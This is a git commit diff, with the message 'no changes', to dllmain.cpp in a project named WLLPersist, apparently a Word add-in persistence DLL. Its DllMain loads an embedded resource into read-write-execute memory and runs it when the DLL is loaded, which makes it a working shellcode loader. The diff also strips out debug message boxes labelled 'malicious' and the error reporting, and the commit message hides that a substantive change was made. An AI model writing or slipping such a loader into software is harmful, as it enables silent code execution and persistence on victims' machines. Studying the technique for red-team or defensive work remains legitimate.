048ff0d75f1d046f75396308e8cfc90afd9c18d6
Dushyanth Chowdary <dnc295@nyu.edu>
2019-07-23 18:11:39 -0400

    no changes

--- WLLPersist/dllmain.cpp
+++ WLLPersist/dllmain.cpp
@@ -1,30 +1,24 @@
-// dllmain.cpp : Defines the entry point for the DLL application.
 #include <windows.h>
 #include "stdafx.h"
 #include "resource.h"
-#include <strsafe.h>
 #include <iostream>
-using namespace std;
 
-extern "C" __declspec(dllexport) void Entry(HMODULE hndl) {
+extern "C" __declspec(dllexport) void Entry() {
 
 }
 
-BOOL APIENTRY DllMain(HMODULE hModule,
-	DWORD  ul_reason_for_call,
-	LPVOID lpReserved
-)
+struct Parameters {
+	std::size_t size_bytes = 0;
+	void* ptr = NULL;
+};
+
+
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
 {
 	switch (ul_reason_for_call)
 	{
 	case DLL_PROCESS_ATTACH: {
-		MessageBox(NULL,L"begins",L"malicious",MB_OK);
-
-		struct Parameters {
-			std::size_t size_bytes = 0;
-			void* ptr = NULL;
-		};
-
+		
 		HRSRC hResource = NULL;
 		HGLOBAL hMemory = NULL;
 
@@ -41,39 +35,12 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 				void * exec = VirtualAlloc(0, p.size_bytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 				memcpy(exec, p.ptr, p.size_bytes);
+				
 				((void(*)())exec)();
 			}
 		}
-		else {
-			LPVOID lpMsgBuf;
-			LPVOID lpDisplayBuf;
-			DWORD dw = GetLastError();
 
-			FormatMessage(
-				FORMAT_MESSAGE_ALLOCATE_BUFFER |
-				FORMAT_MESSAGE_FROM_SYSTEM |
-				FORMAT_MESSAGE_IGNORE_INSERTS,
-				NULL,
-				dw,
-				MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
-				(LPTSTR)&lpMsgBuf,
-				0, NULL);
-
-			// Display the error message and exit the process
-
-			lpDisplayBuf = (LPVOID)LocalAlloc(LMEM_ZEROINIT,
-				(lstrlen((LPCTSTR)lpMsgBuf) + lstrlen((LPCTSTR)"FindResource") + 40) * sizeof(TCHAR));
-			StringCchPrintf((LPTSTR)lpDisplayBuf,
-				LocalSize(lpDisplayBuf) / sizeof(TCHAR),
-				TEXT("%s failed with error %d: %s"),
-				L"FindResource", dw, lpMsgBuf);
-			MessageBox(NULL, (LPCTSTR)lpDisplayBuf, TEXT("Error"), MB_OK);
-
-			LocalFree(lpMsgBuf);
-			LocalFree(lpDisplayBuf);
-		}
-
-		//MessageBox(NULL, L"Ends", L"malicious", MB_OK);
+		
 		break;
 	}
 	case DLL_THREAD_ATTACH:
@@ -81,6 +48,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 	case DLL_PROCESS_DETACH:
 		break;
 	}
+
 
 	return TRUE;
 }
